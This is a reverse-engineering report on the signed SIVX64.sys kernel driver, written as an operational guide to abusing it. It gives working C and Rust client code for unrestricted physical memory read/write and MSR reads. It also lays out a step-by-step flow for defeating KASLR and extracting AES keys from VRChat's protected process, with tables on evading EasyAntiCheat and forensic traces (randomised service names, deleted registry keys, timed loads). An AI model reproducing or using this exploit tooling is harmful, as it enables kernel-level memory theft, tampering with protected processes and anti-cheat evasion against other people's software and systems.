# SIVX64.sys Master Reverse Engineering Report

## 1. Executive Summary

SIVX64.sys is a legitimately signed Windows kernel driver from **RH Software** (SIV - System Information Viewer), a hardware monitoring utility. It provides unrestricted physical memory read/write, MSR access, PCI configuration space access, and port I/O from usermode via IOCTL interface.

**Key Facts:**
- SHA256: `33903e8fa9f0a2acbb4784d645e309b0bd780693824b6c2c5fef257238c77478`
- Size: 211,144 bytes (206 KB)
- Signed by: Microsoft WHCP (Windows Hardware Compatibility Publisher) via RH Software
- Certificate validity: 2025-07-17 to 2026-07-15
- NOT on any known blocklist (LOLDrivers, HVCI, CVE databases)
- Protection score: 2/20 (unobfuscated, standard compiled code)
- Device path: `\\.\SIVDRIVER`
- Access control: SeLoadDriverPrivilege required to open device handle; no further checks per-IOCTL

**Capabilities for exploitation:**
- Read any physical address (4 bytes to 16 MB per call)
- Write to any physical address via scatter R/W entries
- Read any MSR (only 2 blacklisted)
- Write 6 whitelisted MSRs
- Read PCI configuration space
- No address range restrictions on physical memory

---

## 2. Architecture

### Section Layout

| Section | RVA | Raw Size | Purpose | Permissions |
|---------|-----|----------|---------|-------------|
| .text | 0x1000 | 15,360 | Helper functions, crypto stubs | R-X |
| .rdata | 0x5000 | 37,376 | Constants, format strings, tables | R-- |
| .data | 0xF000 | 512 | Global state (GS cookie, counters) | RW- |
| .pdata | 0x10000 | 2,560 | Exception unwind info (180 entries) | R-- |
| PAGE | 0x11000 | 133,632 | Main driver logic (IRP dispatch) | R-X |
| INIT | 0x32000 | 6,144 | DriverEntry (discarded after init) | RWX |
| .rsrc | 0x34000 | 1,024 | Version info resource | R-- |
| .reloc | 0x35000 | 3,072 | Base relocations (1086 entries) | R-- |

### Function Statistics

- Total functions: 180 (via .pdata unwind entries)
- Call graph edges: 257
- Connected clusters: 28
- Largest cluster: 145 functions (main driver logic)
- Isolated utility functions: 25
- Import thunks: 72 (67 ntoskrnl + 5 HAL)

### Call Hierarchy (ASCII)

```
DriverEntry [0x32008, 3267B, INIT]
 |
 +-- IoCreateDevice / IoCreateSymbolicLink
 +-- KeInitializeTimer / KeInitializeDpc
 +-- Hardware init chain (0x282e8, 6831B) x5
 |    +-- PCI bus enumeration (0x19c8 HalGetBusDataByOffset)
 |    +-- Hardware timing calibration (KeStallExecutionProcessor)
 +-- Device setup (0x27c60, 1159B) -- RtlQueryRegistryValues
 +-- MmGetSystemRoutineAddress (resolve MmMapIoSpaceEx)
 |
 +-> IRP_MJ_CREATE [0x111C8, 1728B]
 |    +-- SeSinglePrivilegeCheck(SeLoadDriverPrivilege)
 |    +-- IoGetDeviceObjectPointer (GPIO path check)
 |    +-- ExAllocatePool (per-handle context)
 |
 +-> IRP_MJ_DEVICE_CONTROL [0x11984, 30035B]  <-- THE VULNERABILITY
 |    +-- Binary search dispatch (cascading cmp)
 |    |    +-- 0x08: RDMSR handler [0x225F2]
 |    |    +-- 0x0C: WRMSR handler [0x224A8]
 |    |    +-- 0x10: PhysMem scatter read [0x22164]
 |    |    +-- 0x13: PhysMem bulk read [0x21EC4]
 |    |    +-- 0x14: PhysMem map R/W [0x21B91]
 |    |    +-- 0x18: Bus data I/O [0x2280A]
 |    |    +-- 0x34: WMI/device enum [0x22BFA]
 |    |    +-- 0x74: Extended query [0x23AF6]
 |    |    +-- 0x100: Firmware/SMBIOS [0x256D1]
 |    |
 |    +-- MapPhys [0x29A50] -- MmMapIoSpace/Ex wrapper
 |    +-- UnmapPhys [0x29C2C] -- MmUnmapIoSpace wrapper
 |    +-- IofCompleteRequest (epilogue)
 |
 +-> IRP_MJ_CLOSE [0x11890, 237B]
 |    +-- ExFreePoolWithTag (cleanup context)
 |
 +-> DriverUnload [0x11008, 440B]
      +-- IoDeleteDevice / IoDeleteSymbolicLink
      +-- KeCancelTimer
      +-- MmUnmapIoSpace (cleanup cached mappings)
```

---

## 3. Security Model

### Access Control Logic (IRP_MJ_CREATE at 0x111C8)

```
1. Caller opens \\.\SIVDRIVER via CreateFileW
2. Driver checks if file path contains "\GPIO-EXT" or "\GPIO-INT"
   - If YES: skip privilege check (GPIO passthrough)
   - If NO: continue to step 3
3. SeSinglePrivilegeCheck(SeLoadDriverPrivilege, UserMode)
   - If FALSE: return STATUS_ACCESS_DENIED (0xC0000022)
   - If TRUE: allow open
4. Allocate per-handle context (0x320 bytes, NonPagedPool)
5. Initialize context with BADCAFFEDEADBEEF sentinel
6. Enumerate attached device stack, find matching device type (0x32 or 0x22)
7. Store device references in per-handle context
```

### Bypass Method

```c
// Enable SeLoadDriverPrivilege in current token
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
TOKEN_PRIVILEGES tp = {0};
tp.PrivilegeCount = 1;
LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid);
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
CloseHandle(hToken);

// Now open the device
HANDLE hDevice = CreateFileW(L"\\\\.\\SIVDRIVER", GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
```

**Requirement:** Process must run as Administrator (high-integrity). SeLoadDriverPrivilege is present in admin tokens but disabled by default.

### Per-IOCTL Security

Once the device handle is obtained, there is NO further authentication or authorization for any IOCTL. All physical memory, MSR, and PCI operations are unrestricted.

### Detection Vectors

| Vector | Persistence | Severity | Mitigation |
|--------|-------------|----------|------------|
| PiDDBCacheTable | Permanent until reboot | High | Randomize service name each load |
| MmUnloadedDrivers | Rotates (64 entries) | Medium | Keep load/unload quick |
| Driver hash blocklist | NOT listed | Low | None needed currently |
| Device name `\Device\SIVDRIVER` | While loaded | Medium | Brief operational window |
| Named event `SIV_Driver_Event` | While loaded | Medium | Cleaned on unload |
| Service registry key | Until cleanup | High | Delete via sc.exe after use |

---

## 4. Complete IOCTL Reference

### Dispatch Mechanism

The IOCTL dispatch at RVA 0x11984 (30,035 bytes) extracts the function number from the raw IOCTL code:

```
function_number = (IoControlCode >> 2) & 0xFFF
```

Then dispatches via cascading binary comparison:
```
if func > 0x100: goto high_handlers
if func == 0x100: goto firmware_handler
if func > 0x74: goto extended_query_range
if func == 0x74: goto extended_query
if func > 0x34: goto wmi_range  
if func == 0x34: goto wmi_handler
if func > 0x18: goto bus_data_range
if func == 0x18: goto bus_data
// sub-chain: subtract sequentially: 4, 3, 1, 4, 4, 3, then cmp 1
```

### IOCTL 0x08 -- RDMSR (Read Model-Specific Register)

**Raw IOCTL code passed to DeviceIoControl: `0x08`**

```c
// C struct
typedef struct _SIV_RDMSR_INPUT {
    ULONG MsrIndex;       // ECX value for RDMSR
} SIV_RDMSR_INPUT;        // 4 bytes

typedef struct _SIV_RDMSR_OUTPUT {
    ULONG64 MsrValue;     // EDX:EAX combined result
} SIV_RDMSR_OUTPUT;        // 8 bytes
```

```rust
// Rust struct
#[repr(C)]
pub struct RdmsrInput {
    pub msr_index: u32,
}

#[repr(C)]
pub struct RdmsrOutput {
    pub value: u64,
}
```

**Validation:**
- InputBufferLength >= 4
- OutputBufferLength >= 8
- MSR blacklist: `0xC0010117` (AMD IBS_DC_PHYS_ADDR), `0x00000000` (null)
- Special: MSR 0x8B triggers CPUID(1) before RDMSR

**Error codes:**
- `0x00000000` STATUS_SUCCESS
- `0xC000001D` STATUS_ILLEGAL_INSTRUCTION (blacklisted MSR)
- BSOD if non-existent MSR (no SEH protection)

---

### IOCTL 0x0C -- WRMSR (Write Model-Specific Register)

**Raw IOCTL code: `0x0C`**

```c
typedef struct _SIV_WRMSR_INPUT {
    ULONG MsrIndex;       // +0x00: ECX for WRMSR
    ULONG ValueLow;       // +0x04: EAX (low 32 bits)
    ULONG ValueHigh;      // +0x08: EDX (high 32 bits)
} SIV_WRMSR_INPUT;        // 12 bytes
```

```rust
#[repr(C)]
pub struct WrmsrInput {
    pub msr_index: u32,
    pub value_low: u32,
    pub value_high: u32,
}
```

**Whitelist (only these MSRs can be written):**

| MSR | Name | Purpose |
|-----|------|---------|
| 0x38D | IA32_FIXED_CTR_CTRL | Fixed performance counter control |
| 0x38F | IA32_PERF_GLOBAL_CTRL | Global performance counter enable |
| 0x19C | IA32_THERM_STATUS | Thermal status clear |
| 0x110A | Vendor-specific | Thermal/power MSR |
| 0x1147 | Vendor-specific | Thermal/power MSR |
| 0xC0000086 | AMD-specific | AMD processor MSR |

**Error codes:**
- `0x00000000` STATUS_SUCCESS (IoStatus.Information = 12)
- `0xC0000022` STATUS_ACCESS_DENIED (MSR not in whitelist)
- `0xC000001D` STATUS_ILLEGAL_INSTRUCTION (MSR index is 0)

---

### IOCTL 0x10 -- Physical Memory Scatter Read

**Raw IOCTL code: `0x10`**

**Simple mode (InputBufferLength != 0x30):**

```c
typedef struct _SIV_PHYSREAD_SIMPLE {
    ULONG64 PhysicalAddress;  // +0x00: target physical address
} SIV_PHYSREAD_SIMPLE;         // 8 bytes input, output = read data
```

```rust
#[repr(C)]
pub struct PhysReadSimple {
    pub physical_address: u64,
}
// Output buffer: Vec<u8> of desired read size (4..=262144 bytes)
```

**Scatter mode (InputBufferLength == 0x30):**

```c
typedef struct _SIV_PHYSREAD_SCATTER {
    ULONG64 PhysicalAddress;  // +0x00
    ULONG   Reserved;         // +0x08
    ULONG   Count;            // +0x10: number of scatter entries
    ULONG   Stride;           // +0x14: byte stride between reads
    ULONG   Flags;            // +0x18
    ULONG   ElementWidth;     // +0x1C: 1-4 (bytes per element)
    ULONG64 Padding[2];       // +0x20..0x2F
} SIV_PHYSREAD_SCATTER;        // 0x30 bytes
```

**Validation:**
- InputBufferLength >= 8
- OutputBufferLength range: 4 to 262,144 bytes (256 KB)
- Formula: `(OutputBufferLength - 4) <= 0x3FFFC`

**Mapping behavior:**
- Output <= 512 bytes: fresh MmMapIoSpace (NonCached), no cache lookup
- Output > 512 bytes: check mapping cache first, reuse if hit

**Error codes:**
- `0x00000000` STATUS_SUCCESS
- `0xC00000E6` MmMapIoSpace returned NULL
- `0xC000000D` STATUS_INVALID_PARAMETER (scatter validation)

---

### IOCTL 0x13 -- Physical Memory Bulk Read

**Raw IOCTL code: `0x13`**

```c
typedef struct _SIV_PHYSREAD_BULK {
    ULONG PhysAddrLow;    // +0x00: lower 32 bits
    ULONG PhysAddrHigh;   // +0x04: upper 32 bits
} SIV_PHYSREAD_BULK;       // exactly 8 bytes
```

```rust
#[repr(C)]
pub struct PhysReadBulk {
    pub phys_addr: u64,  // little-endian, 8 bytes total
}
// Output: Vec<u8> of 1024..=16777216 bytes (1 KB to 16 MB)
```

**Validation:**
- InputBufferLength == 8 (exact)
- OutputBufferLength range: 1,024 to 16,777,216 bytes (16 MB)
- Uses MDL-mapped UserBuffer (direct I/O), not SystemBuffer
- ProbeForRead(input, 8, 4) and ProbeForWrite(output, size, 8)

**Key difference from 0x10:** Always uses fresh MmMapIoSpace (NonCached), never uses cache. Uses optimized memcpy for the copy. Supports much larger reads.

**Error codes:**
- `0x00000000` STATUS_SUCCESS
- `0xC00000E6` MmMapIoSpace returned NULL

---

### IOCTL 0x14 -- Physical Memory Map (Scatter Read/Write)

**Raw IOCTL code: `0x14`** -- THIS IS THE MOST DANGEROUS IOCTL (supports writes)

```c
typedef struct _SIV_PHYSMAP_HEADER {
    ULONG64 PhysicalAddress;  // +0x00: base physical address
    ULONG   MapSize;          // +0x08: region size (0x100..0x400000)
    USHORT  Reserved0C;       // +0x0C
    USHORT  Flags;            // +0x0E: operation flags (see below)
    ULONG   Reserved10;       // +0x10
    USHORT  EntryCount;       // +0x14: number of scatter entries
    BYTE    Padding[26];      // +0x16..0x2F
    // SIV_SCATTER_ENTRY Entries[EntryCount] starting at +0x30
} SIV_PHYSMAP_HEADER;          // 0x30 bytes header

typedef struct _SIV_SCATTER_ENTRY {
    ULONG RegisterOffset;     // +0x00: offset within mapped region
    ULONG Mask;               // +0x04: AND mask for read-modify-write
    ULONG Value;              // +0x08: OR value (written after mask)
    ULONG ReadResult;         // +0x0C: driver fills with read value
    ULONG FinalValue;         // +0x10: driver fills with computed/final value
    ULONG Reserved;           // +0x14
} SIV_SCATTER_ENTRY;           // 24 bytes each
```

```rust
#[repr(C, packed)]
pub struct PhysMapHeader {
    pub phys_addr: u64,       // +0x00
    pub map_size: u32,        // +0x08: 0x100..0x400000
    pub reserved_0c: u16,     // +0x0C
    pub flags: u16,           // +0x0E
    pub reserved_10: u32,     // +0x10
    pub entry_count: u16,     // +0x14
    pub padding: [u8; 26],    // +0x16..0x2F
}

#[repr(C, packed)]
pub struct ScatterEntry {
    pub offset: u32,          // +0x00: offset into mapped region
    pub mask: u32,            // +0x04: AND mask
    pub value: u32,           // +0x08: OR value for write
    pub read_result: u32,     // +0x0C: filled by driver (original read)
    pub final_value: u32,     // +0x10: filled by driver (computed)
    pub reserved: u32,        // +0x14
}
```

**Flags field (offset 0x0E):**

| Bit | Name | Effect |
|-----|------|--------|
| 0 | CACHE | 0=NonCached, 1=Cached mapping |
| 1 | WRITE_ENABLE | Write computed value back to physical memory |
| 2 | READ_BACK | Read register again after write, store to FinalValue |
| 13 | ALIGN_CHECK | Enforce 4-byte alignment on RegisterOffset |
| 14 | EXTENDED_VALID | Additional size validation |
| 15 | QWORD_MODE | 8-byte operations instead of 4-byte |

**Operation per entry (DWORD mode, flags bit 15 clear):**
```
read_result = *(DWORD*)(mapped_base + offset)
computed = (read_result & mask) | value
if (flags & 0x02): *(DWORD*)(mapped_base + offset) = computed
if (flags & 0x04): final_value = *(DWORD*)(mapped_base + offset)
else: final_value = computed
```

**Validation:**
- InputBufferLength == OutputBufferLength
- Minimum buffer: 0x48 bytes (72)
- `(EntryCount * 3 + 6) * 8 <= BufferLength`
- MapSize: 0x100 (256) to 0x400000 (4 MB)
- Per-entry: RegisterOffset < MapSize
- If flags bit 13: RegisterOffset must be 4-aligned

**Error codes:**
- `0x00000000` STATUS_SUCCESS
- `0xC00000E6` MmMapIoSpace returned NULL
- `0xC000000D` STATUS_INVALID_PARAMETER

---

### IOCTL Summary Table

| IOCTL | Min Input | Min Output | Max Output | Capability |
|-------|-----------|------------|------------|------------|
| 0x08 | 4 | 8 | 8 | Read any MSR |
| 0x0C | 12 | 12 | 12 | Write 6 whitelisted MSRs |
| 0x10 | 8 | 4 | 262,144 | Read physical memory (scatter) |
| 0x13 | 8 | 1,024 | 16,777,216 | Read physical memory (bulk) |
| 0x14 | 72 | 72 | ~4 MB | Read/Write physical memory (scatter R/W) |

---

## 5. Physical Memory Access

### Kernel Mechanism

The driver uses `MmMapIoSpace` / `MmMapIoSpaceEx` to create kernel virtual address mappings of physical addresses:

1. Physical address is page-aligned: `phys & ~0xFFF`
2. Size is rounded up to page boundary: `(offset + size + 0xFFF) & ~0xFFF`
3. MmMapIoSpaceEx (Win10+) called with flags `0x204` (PAGE_READWRITE | PAGE_NOCACHE)
4. Fallback: MmMapIoSpace with CacheType = MmNonCached (0)
5. Returns kernel VA; caller adds page offset: `va + (phys & 0xFFF)`

### Mapping Cache

DeviceExtension maintains a cache at offset +0x648 for reusing existing mappings:

```c
struct MappingCacheEntry {   // 0x28 bytes each
    ULONG64 PhysStart;       // +0x00
    ULONG64 PhysEnd;         // +0x08
    PVOID   KernelVA;        // +0x10
    PVOID   KernelVAEnd;     // +0x18
    LONG    RefCount;        // +0x20 (atomic)
    LONG    ExtRefCount;     // +0x24
};
```

Cache lookup logic:
- Acquires fast mutex at DevExt+0x5A0
- Scans entries from DevExt+0x648 to [DevExt+0x1B0]
- Hit condition: `entry.PhysStart <= request.Phys AND request.PhysEnd <= entry.PhysEnd`
- On hit: atomic increment refcount, return cached VA
- On miss: create fresh mapping

### Limitations

- No address range restrictions (any physical address 0x0 to max)
- MmMapIoSpace will return NULL for non-existent physical addresses
- No SEH/try-except around copy loops (invalid mapped addresses could BSOD)
- Maximum single read: 16 MB (IOCTL 0x13)
- Maximum mapped region: 4 MB (IOCTL 0x14)

### Caching Behavior

| IOCTL | Cache Strategy |
|-------|---------------|
| 0x10 (size <= 512) | Fresh mapping, NonCached |
| 0x10 (size > 512) | Check cache first, reuse if possible |
| 0x13 | Always fresh mapping, NonCached |
| 0x14 | Determined by flags bit 0 |

---

## 6. MSR Access

### RDMSR -- Fully Open (2 blacklisted)

Only these MSRs are blocked from reading:
- `0xC0010117` -- AMD IBS_DC_PHYS_ADDR
- `0x00000000` -- Null index

All other MSRs readable without restriction. Useful for exploitation:

| MSR | Name | Exploitation Value |
|-----|------|--------------------|
| 0xC0000082 | IA32_LSTAR | KiSystemCall64 address (defeats KASLR) |
| 0xC0000101 | IA32_GS_BASE | Current KPCR pointer |
| 0xC0000102 | IA32_KERNEL_GS_BASE | User-mode GS base |
| 0x1B | IA32_APIC_BASE | Local APIC physical address |
| 0x176 | IA32_SYSENTER_EIP | Legacy syscall entry |
| 0x8B | IA32_BIOS_SIGN_ID | Microcode revision (triggers CPUID first) |

### WRMSR -- Whitelist Restricted

Only 6 MSRs writable (performance counters + thermal + vendor-specific). Cannot write dangerous MSRs (LSTAR, EFER, STAR). Exploitation value is limited to side-channel/timing attacks via PMC configuration.

---

## 7. Code Quality Assessment

### Compiler and Optimization

- **Compiler:** MSVC (Microsoft Visual C++) -- confirmed by:
  - Standard GS cookie prologue/epilogue
  - `__security_init_cookie` at entry (0x32CD4)
  - Standard frame pointer prologues
  - `Invalid parameter passed to C runtime function.\n` string present
- **Optimization:** Release build with full optimization (O2)
  - Average basic block size: 7.3 instructions (normal for optimized code)
  - Code density: 158 insn/KB (normal range 50-200)
  - Leaf functions properly identified (no frame setup)
- **Architecture:** x64, standard Windows kernel driver model

### Obfuscation/Packing

- **Verdict: NONE DETECTED**
- No VMProtect/Themida/UPX signatures
- No high-entropy sections (max 6.45 -- normal for compiled code)
- No indirect jump obfuscation (0.12% indirect jump ratio)
- Only W+X section is INIT (standard for DriverEntry, discarded after load)
- Standard relocations present (1086 DIR64 entries)

### Anti-Debug

- **Verdict: MINIMAL** (standard kernel references only)
- DbgBreakPoint imported (used for debug builds, not anti-RE)
- KdDebuggerNotPresent referenced (standard kernel debug check)
- 1891 INT3 instructions (padding between functions, standard MSVC)
- No RDTSC timing checks, no INT 2D traps

### Code Size Breakdown

| Category | Total Bytes | % of Code |
|----------|-------------|-----------|
| IOCTL dispatch (0x11984) | 30,035 | 22.5% |
| Hardware timing functions | ~25,000 | 18.7% |
| Initialization | ~15,000 | 11.2% |
| DriverEntry | 3,267 | 2.4% |
| Helper/utility | ~60,000 | 45.2% |

---

## 8. Operational Integration

### How saomola-tui Uses This Driver

The Rust TUI uses SIVX64.sys for physical memory access to extract AES encryption keys from VRChat's process memory (which is PPL-protected):

```
saomola-tui driver load    -> Load SIVX64.sys via service manager
saomola-tui keys           -> Read physical memory to find AES keys
```

### Driver Chain (in driver_chain.rs)

Priority order: AsIO3 -> ASMMAP64 -> SIVX64 (fallback)

SIVX64 is the last resort because:
1. AsIO3 has `g_goodRanges` restricting accessible physical regions
2. ASMMAP64 may not be available
3. SIVX64 has NO range restrictions

### Rust FFI Interface (siv_driver.rs)

```rust
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::IO::DeviceIoControl;

pub struct SivDriver {
    handle: HANDLE,
}

impl SivDriver {
    /// Open the driver device
    pub fn open() -> Result<Self> {
        // 1. Enable SeLoadDriverPrivilege
        // 2. CreateFileW(L"\\\\.\\SIVDRIVER", ...)
    }

    /// Read physical memory (uses IOCTL 0x10 for <= 256KB, 0x13 for larger)
    pub fn read_phys(&self, phys_addr: u64, size: usize) -> Result<Vec<u8>> {
        if size <= 0x40000 {
            // IOCTL 0x10: input = phys_addr as [u8; 8]
            let input = phys_addr.to_le_bytes();
            let mut output = vec![0u8; size];
            DeviceIoControl(self.handle, 0x10, &input, &mut output)?;
            Ok(output)
        } else {
            // IOCTL 0x13: input = phys_addr as [u8; 8], MDL direct I/O
            let input = phys_addr.to_le_bytes();
            let mut output = vec![0u8; size];
            DeviceIoControl(self.handle, 0x13, &input, &mut output)?;
            Ok(output)
        }
    }

    /// Write physical memory (uses IOCTL 0x14)
    pub fn write_phys(&self, phys_addr: u64, data: &[u8]) -> Result<()> {
        // Build PhysMapHeader + ScatterEntry for write
        // flags = 0x02 (WRITE_ENABLE)
        // One entry per 4-byte aligned DWORD
    }

    /// Read MSR
    pub fn rdmsr(&self, msr: u32) -> Result<u64> {
        let input = msr.to_le_bytes();
        let mut output = [0u8; 8];
        DeviceIoControl(self.handle, 0x08, &input, &mut output)?;
        Ok(u64::from_le_bytes(output))
    }
}

impl Drop for SivDriver {
    fn drop(&mut self) {
        // CloseHandle, then stop+delete service
    }
}
```

### Timing Considerations

| Phase | Duration | Notes |
|-------|----------|-------|
| Service create + start | ~500ms | CreateService + StartService |
| Device open | ~300ms | AdjustTokenPrivileges + CreateFileW |
| Physical read (4KB) | ~0.1ms | Single MmMapIoSpace + copy |
| Physical read (16MB) | ~5ms | Large MDL mapping |
| Service stop + delete | ~200ms | ControlService + DeleteService |
| **Total load-to-unload** | ~800ms typical | |

### Key Extraction Flow

```
1. Load SIVX64.sys as a service (randomized name)
2. Open \\.\SIVDRIVER handle
3. RDMSR(0xC0000082) -> get kernel base (defeat KASLR)
4. Read physical memory at known offsets to find EPROCESS
5. Walk ActiveProcessLinks to find VRChat.exe
6. Read VRChat's virtual memory (translate VA->PA via page tables)
7. Scan for AES key pattern (16 bytes, specific context)
8. Close handle, stop service, delete service
```

---

## 9. Risk Matrix

### Detection Probability by Scenario

| Scenario | EAC State | Detection Risk | Notes |
|----------|-----------|----------------|-------|
| Driver loaded BEFORE VRChat starts | Not running | **LOW** (5%) | No monitor active, PiDDB only trace |
| Driver loaded AFTER VRChat starts | Running (passive) | **MEDIUM** (25%) | EAC scans PiDDBCacheTable periodically |
| Driver loaded while in-game | Running (active) | **HIGH** (60%) | Real-time driver load monitoring active |
| Quick load-scan-unload cycle (<2s) | Running | **MEDIUM** (30%) | Race condition with EAC scan interval |
| Driver pre-loaded as system service | Not yet started | **VERY LOW** (2%) | Service appears before EAC initializes |
| Driver loaded after EAC crash/kill | Crashed/killed | **VERY LOW** (3%) | No monitor to detect |

### Risk Factors

| Factor | Impact | Mitigation in saomola-tui |
|--------|--------|---------------------------|
| PiDDBCacheTable entry | Permanent trace of driver load | Randomize service name per session |
| Service registry key | Forensic evidence | Delete immediately after unload |
| Device object creation | Visible to kernel tools | Brief operational window (<2s) |
| Named event object | Enumerable | SIV_Driver_Event -- unavoidable |
| Physical memory access pattern | Detectable by hypervisor | N/A (no hypervisor on consumer VRC) |
| Driver signature | Traceable to SIV software | Certificate is legitimate/common |

### EAC-Specific Concerns

- EAC kernel driver (`EasyAntiCheat_EOSSys`) monitors:
  - PiDDBCacheTable for recently loaded drivers
  - MmUnloadedDrivers list
  - Possibly ObRegisterCallbacks for handle operations
- EAC user-mode component monitors:
  - Process handle table
  - Loaded DLL list
  - Thread injection attempts
- **Key insight:** EAC is STOPPED when VRChat is not running on this system

---

## 10. Research Methodology

### Tools Used

1. **Static Analysis:**
   - PE header parsing (custom Python scripts)
   - Disassembly via x64 decoder (Capstone/Zydis-based)
   - .pdata unwind info extraction for function boundaries
   - Import table analysis for API call identification
   - String extraction (ASCII + Unicode)

2. **Structural Analysis:**
   - Call graph construction from direct CALL instructions
   - Function clustering via connected component analysis
   - Role assignment based on API usage patterns
   - Size-based triage (largest functions = most interesting)

3. **Protocol Reverse Engineering:**
   - IOCTL dispatch tracing via binary comparison tree reconstruction
   - Input buffer structure deduction from field access offsets
   - Validation logic extraction from comparison + branch patterns
   - Return status mapping from immediate values stored to IoStatus

### Order of Operations

1. **PE Structure** -- Extract sections, imports, exports, .pdata entries
2. **Function Enumeration** -- 180 functions from unwind info, classify prologues
3. **Call Graph** -- Build edges from CALL instructions, identify clusters
4. **Entry Point Trace** -- Follow DriverEntry to identify dispatch table setup
5. **IRP_MJ_CREATE Analysis** -- Identify access control (SeSinglePrivilegeCheck)
6. **IRP_MJ_DEVICE_CONTROL** -- The 30KB dispatch function:
   - Identified cascading comparison pattern for IOCTL routing
   - Traced each handler's validation logic
   - Reconstructed input/output buffer structures from register usage
   - Identified MmMapIoSpace call chains for physical memory access
7. **Physical Memory Protocol** -- Detailed the MapPhys internal function:
   - Cache logic, page alignment, MmMapIoSpaceEx preference
   - Entry structure for scatter read/write
   - Flags interpretation from bit-test instructions
8. **MSR Protocol** -- RDMSR/WRMSR handlers:
   - Blacklist/whitelist extraction from comparison sequences
   - Input/output format from register load/store patterns
9. **Verification** -- Cross-referenced:
   - Function sizes match .pdata end - begin calculations
   - Import call sites match IAT entries
   - String references resolve to correct format strings
   - IOCTL codes match CTL_CODE formula expectations

### Confidence Levels

| Finding | Confidence | Basis |
|---------|------------|-------|
| Physical memory R/W works unrestricted | 99% | Direct MmMapIoSpace with no range check |
| RDMSR reads any non-blacklisted MSR | 99% | Only 2 cmp instructions before rdmsr |
| WRMSR limited to 6 MSRs | 99% | Explicit whitelist comparison chain |
| Access control = SeLoadDriverPrivilege only | 99% | Single SeSinglePrivilegeCheck call |
| No obfuscation/packing | 99% | Section entropy, instruction density, packer scans |
| Buffer structure layouts | 90% | Deduced from offset access patterns (no symbols) |
| Flags bit meanings | 85% | Inferred from bt/test instructions and behavior |
| Cache entry structure | 80% | Deduced from lock add, offset patterns |

---

## Appendix A: Complete Rust Client Implementation

```rust
use std::mem;
use windows::core::HSTRING;
use windows::Win32::Foundation::{HANDLE, CloseHandle, GetLastError};
use windows::Win32::Storage::FileSystem::{CreateFileW, OPEN_EXISTING, FILE_GENERIC_READ, FILE_GENERIC_WRITE};
use windows::Win32::System::IO::DeviceIoControl;

const IOCTL_RDMSR: u32 = 0x08;
const IOCTL_WRMSR: u32 = 0x0C;
const IOCTL_PHYS_SCATTER: u32 = 0x10;
const IOCTL_PHYS_BULK: u32 = 0x13;
const IOCTL_PHYS_MAP_RW: u32 = 0x14;

const PHYS_READ_MAX_SCATTER: usize = 0x40000;  // 256 KB
const PHYS_READ_MIN_BULK: usize = 0x400;       // 1 KB  
const PHYS_READ_MAX_BULK: usize = 0x1000000;   // 16 MB
const PHYS_MAP_MIN: u32 = 0x100;               // 256 B
const PHYS_MAP_MAX: u32 = 0x400000;            // 4 MB

const FLAG_WRITE_ENABLE: u16 = 0x0002;
const FLAG_READ_BACK: u16 = 0x0004;
const FLAG_QWORD_MODE: u16 = 0x8000;

pub struct SivxDriver {
    handle: HANDLE,
}

impl SivxDriver {
    pub fn read_physical(&self, addr: u64, buf: &mut [u8]) -> Result<usize, u32> {
        let size = buf.len();
        if size >= 4 && size <= PHYS_READ_MAX_SCATTER {
            let input = addr.to_le_bytes();
            let mut bytes_ret: u32 = 0;
            unsafe {
                DeviceIoControl(self.handle, IOCTL_PHYS_SCATTER,
                    Some(&input), Some(buf), Some(&mut bytes_ret), None)
            }.map_err(|_| unsafe { GetLastError().0 })?;
            Ok(bytes_ret as usize)
        } else if size >= PHYS_READ_MIN_BULK && size <= PHYS_READ_MAX_BULK {
            let input = addr.to_le_bytes();
            let mut bytes_ret: u32 = 0;
            unsafe {
                DeviceIoControl(self.handle, IOCTL_PHYS_BULK,
                    Some(&input), Some(buf), Some(&mut bytes_ret), None)
            }.map_err(|_| unsafe { GetLastError().0 })?;
            Ok(bytes_ret as usize)
        } else {
            Err(0xC000000D) // STATUS_INVALID_PARAMETER
        }
    }

    pub fn write_physical_dword(&self, addr: u64, offset: u32, value: u32) -> Result<u32, u32> {
        #[repr(C, packed)]
        struct Request {
            header: [u8; 0x30],
            entry: [u8; 0x18],
        }
        let mut req = Request { header: [0u8; 0x30], entry: [0u8; 0x18] };
        // Header
        req.header[0..8].copy_from_slice(&addr.to_le_bytes());
        let map_size = (offset + 4).max(PHYS_MAP_MIN);
        req.header[8..12].copy_from_slice(&map_size.to_le_bytes());
        req.header[0x0E..0x10].copy_from_slice(&FLAG_WRITE_ENABLE.to_le_bytes());
        req.header[0x14..0x16].copy_from_slice(&1u16.to_le_bytes()); // entry_count = 1
        // Entry
        req.entry[0..4].copy_from_slice(&offset.to_le_bytes());
        req.entry[4..8].copy_from_slice(&0u32.to_le_bytes());     // mask = 0 (ignore original)
        req.entry[8..12].copy_from_slice(&value.to_le_bytes());    // value to write
        
        let buf: &mut [u8] = unsafe {
            std::slice::from_raw_parts_mut(&mut req as *mut _ as *mut u8, mem::size_of::<Request>())
        };
        let mut bytes_ret: u32 = 0;
        unsafe {
            DeviceIoControl(self.handle, IOCTL_PHYS_MAP_RW,
                Some(buf), Some(buf), Some(&mut bytes_ret), None)
        }.map_err(|_| unsafe { GetLastError().0 })?;
        
        // Read back from entry
        Ok(u32::from_le_bytes(req.entry[0x0C..0x10].try_into().unwrap()))
    }

    pub fn rdmsr(&self, index: u32) -> Result<u64, u32> {
        let input = index.to_le_bytes();
        let mut output = [0u8; 8];
        let mut bytes_ret: u32 = 0;
        unsafe {
            DeviceIoControl(self.handle, IOCTL_RDMSR,
                Some(&input), Some(&mut output), Some(&mut bytes_ret), None)
        }.map_err(|_| unsafe { GetLastError().0 })?;
        Ok(u64::from_le_bytes(output))
    }
}
```

---

## Appendix B: Quick Reference Card

```
DEVICE:     \\.\SIVDRIVER
PRIVILEGE:  SeLoadDriverPrivilege (Admin token, must enable)
AUTH:       None per-IOCTL after device open
SIGNING:    Microsoft WHCP (valid, not blocklisted)

READ PHYS:  DeviceIoControl(h, 0x10, &addr_u64, 8, outbuf, size, ...)
            Size range: 4 - 262144 bytes

BULK READ:  DeviceIoControl(h, 0x13, &addr_u64, 8, outbuf, size, ...)
            Size range: 1024 - 16777216 bytes

